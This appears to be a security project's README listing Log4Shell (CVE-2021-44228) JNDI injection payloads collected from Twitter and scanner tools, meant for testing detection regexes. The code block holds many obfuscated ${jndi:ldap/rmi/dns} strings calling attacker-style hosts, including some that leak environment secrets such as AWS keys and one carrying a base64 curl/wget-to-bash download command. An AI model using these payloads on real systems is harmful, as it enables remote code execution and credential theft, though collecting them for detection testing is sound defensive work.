# Payload samples

This is a list of [log4shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) payloads seen on my twitter feeds.

The goal is to allows testing detection regexes defined in protection systems.

## Sources & credits

* https://twitter.com/h4x0r_dz/status/1469663187079417857/photo/1
* https://twitter.com/ymzkei5/status/1469765165348704256
* https://twitter.com/sirifu4k1/status/1469524530255511552
* https://twitter.com/BountyOverflow/status/1470001858873802754
* https://twitter.com/entropyqueen_/status/1469961345848299520
* https://twitter.com/anthrax0/status/1470276303773663233
* https://twitter.com/log4j2rce/status/1469799982630944770
* https://twitter.com/11xuxx/status/1471236310299906050
* https://github.com/projectdiscovery/nuclei-templates/pull/3334/files
* https://github.com/PortSwigger/log4shell-scanner/blob/master/src/main/kotlin/burp/BurpExtender.kt#L70
* https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words/blob/main/src/main/java/log4j.java
* https://github.com/tangxiaofeng7/BurpLog4j2Scan/blob/master/src/main/java/burp/BurpExtender.java#L84
* https://github.com/fullhunt/log4j-scan/blob/master/log4j-scan.py#L52
* https://github.com/takito1812/log4j-detect/blob/main/log4j-detect.py#L9
* https://docs.google.com/document/d/15V4EmDcOl4Mog5-If-Mv3-ZoRcf9-RsGSWlqYte3zho/edit
* https://www.cyberkendra.com/2021/12/log4shell-advisory-resource-cheat-sheet.html
* https://blog.talosintelligence.com/2021/12/apache-log4j-rce-vulnerability.html

## Value collections

* https://github.com/Neo23x0/log4shell-detector/tree/main/tests/test-cases
* https://github.com/whwlsfb/Log4j2Scan/tree/master/src/main/java/burp/poc/impl

## Values gathered

> When a source was not an image then values provided were added to the list below.

💡 Note that `:/` instead of `://` is effective too.

```text
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://1234.${hostName}.com}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker_controled_website/payload_to_be_executed}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/ass}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker_controled_website/payload_to_be_executed}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}},
${${::-j}nd${::-i}:
${${::-j}ndi:
${${::-j}ndi:dns://${env:USERNAME}.c6roi3ia89k5kj1mes60cg5a1doyyyyyn.interactsh.com}
${${::-j}ndi:rmi://127.0.0.1:1389/ass}
${${::-j}ndi:rmi://{{callback_host}}/{{random}}},
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}attacker_controled_website/payload_to_be_executed}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
${${env:TEST:-j}ndi${env:TEST:-:}${env:TEST:-l}dap${env:TEST:-:}attacker_controled_website/payload_to_be_executed}
${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}
${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host/{{random}}},
${${lower:jndi}:${lower:rmi}://dslepf.dnslog.cn/tem}
${${lower:jndi}:${lower:rmi}://q.w.e/poc}
${${lower:jndi}:${lower:rmi}://{{callback_Host}}/{{random}}},
${${lower:jnd}${lower:${upper:ı}}:ldap://...}
${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://xxx
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}},
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://dslepf.dnslog.cn/tem}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}},
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker_controled_website/payload_to_be_executed}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}
${${upper:j}ndi:${upper:l}${upper:d}a${upper:p}://somesitehackerofhell.com/z}
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.{{interactsh-url}}}
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://1234.${hostName}.com}
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker_controled_website/payload_to_be_executed }
${jndi:${lower:l}${lower:d}a${lower:p}://attacker_controled_website/payload_to_be_executed}
${jndi:${lower:l}${lower:d}a${lower:p}://example.com/
${jndi:${lower:l}${lower:d}ap://attacker_controled_website/payload_to_be_executed}
${jndi:dns://${env:COMPUTERNAME}.uedo81.dnslog.cn/a}
${jndi:dns://${env:USERDOMAIN}.qnfw43.dnslog.cn/a}
${jndi:dns://${hostName}.uedo81.dnslog.cn/a}
${jndi:dns://aeutbj.example.com/ext}
${jndi:dns://{{callback_host}}}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.badserver.com} 
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${env:USER}.attacker.server/}
${jndi:ldap://${env:user}.uedo81.dnslog.cn/exp}
${jndi:ldap://${hostName}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://45.155.205[.]233[:]12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC9bdmljdGltIElQXTpbdmljdGltIHBvcnRdfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0L1t2aWN0aW0gSVBdOlt2aWN0aW0gcG9ydF0pfGJhc2gK}
${jndi:ldap://dslepf.dnslog.cn/exp}
${jndi:ldap://somesitehackerofhell.com/z}
${jndi:rmi://a.b.c}
${jndi:rmi://{{callback_host}}},
j${::-nD}i${::-:}
j${EnV:K5:-nD}i:
j${k8s:k5:-ND}i${sd:k5:-:}
j${loWer:Nd}i${uPper::}
j${main:\k5:-Nd}i${spring:k5:-:}
j${sys:k5:-nD}${lower:i${web:k5:-:}}
jn${date:}di${date:':'}
jn${env::-}di:
```
